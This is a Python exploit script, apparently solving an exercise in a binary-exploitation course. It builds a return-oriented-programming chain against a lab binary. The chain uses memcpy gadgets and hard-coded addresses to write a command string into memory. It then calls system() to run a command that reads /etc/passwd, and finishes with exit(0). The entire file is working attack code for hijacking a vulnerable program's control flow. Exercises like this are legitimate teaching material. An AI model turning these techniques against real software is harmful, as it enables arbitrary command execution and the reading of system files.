#!/usr/bin/env python3
from math import prod
import sys
from common import *

def try_build_memcpys_chain(addr, s, do_shuffle = True):
    """
    given an input string s and an addr; parses s and builds a chain of memcpys
    writing s to the memory starting at addr. the parsing is based on a
    manually pre-built dictionary of snippet->address mappings, mapping
    sequences of bytes to addresses in the disassembly.

    used for task 3, but not task 4, since I figured out how to to make
    arbitrary writes using the `add [rsi], rdi` gadget.
    """

    from collections import OrderedDict

    def LCP_len(x, y):
        # length of longest common prefix between two strings
        cumprod = lambda xs: [math.prod(xs[:i + 1]) for i in range(len(xs))]
        return sum(cumprod([a == b for (a, b) in zip(x, y)]))

    # a dict of various snippet/address mappings I found in the disassembly.
    # not all of these are necessary for task 3.
    _map = {
        b"/l": 0x400238, b"u":   0x4008a4, b"s":  0x400c6d, b"r": 0x4003fd,
        b"g":  0x400cc1, b"me":  0x400416, b"o":  0x4003e7, b"l": 0x400239,
        b" ":  0x400d13, b"et":  0x400423, b"c":  0x400d19, b"p": 0x4003ec,
        b"as": 0x400d11, b"s":   0x400d12, b"sw": 0x400cd0, b"d": 0x400c78,
        b"\0": 0x4003e0, b"P":   0x400671, b"AT": 0x40074a, b"H": 0x40074d,
        b"=":  0x4006a6, b"b":   0x4003e3, b"in": 0x4003ee, b"f": 0x400410,
        b"ta": 0x400432, b"cat": 0x400d19, b"1":  0x400444, b"-": 0x40024b,
        b".":  0x400450, b"x":   0x400248, b"y":  0x40041b, b"|": 0x400b45,
        b"L":  0x40043d, b"D":   0x400896, b"_":  0x400430, b"R": 0x400a19,
        b"E":  0x400756, b"O":   0x400a10, b"6":  0x40023c, b"n": 0x4003ef,
        b"k":  0x400940, b"i":   0x40023a, b"v":  0x400400, b"h": 0x4009f9,
    }
    # we want to sort the dictionaries in descending order of prefix length,
    # such that we always use the longest prefix available.
    _map = OrderedDict(sorted(_map.items(), key = lambda t: -len(t[0])))

    if isinstance(s, str) and s.isascii():
        s = bytes(s, encoding = "ascii")
    if not isinstance(s, bytes):
        raise ValueError(f"First arg should be ascii string or bytes")
    if not s.endswith(b"\x00"):
        s += b"\x00"

    chains = []
    cur_addr = addr
    while len(s) > 0:
        tmp = [(addr, n) for (k, addr) in _map.items()
               if (n := LCP_len(s, k)) > 0]
        if len(tmp) <= 0:
            raise ValueError(f"Failed to build MemcpyChain for: {s}")

        src_addr, n_bytes = tmp[0]
        chains   += [memcpy_chain(cur_addr, src_addr, n_bytes)]
        cur_addr += n_bytes
        s = s[n_bytes:]

    if do_shuffle: random.shuffle(chains)
    return b"".join(chains)


def task_3():
    addr = 0x403160
    system_arg = "/usr/games/lolcat -p 1 /etc/passwd"

    # write the system() argument string to a known safe addr in mem
    rop = b""
    rop += try_build_memcpys_chain(addr, system_arg)
    #  rop += arbitrary_write_chain(addr, system_arg)

    # align, if necessary after the memcpy chain.
    rop = do_align(rop)

    # call system("usr/games/lolcat ..."), then exit(0).
    rop += call_libc_chain("getline", "system", rdi = addr)
    rop += call_libc_chain("system", "exit", rdi = 0)

    # prepend stack garbage and append newline.
    rop = GARBAGE_BYTES + rop + b"\n"

    sys.stdout.buffer.write(rop)

if __name__ == "__main__":
    task_3()
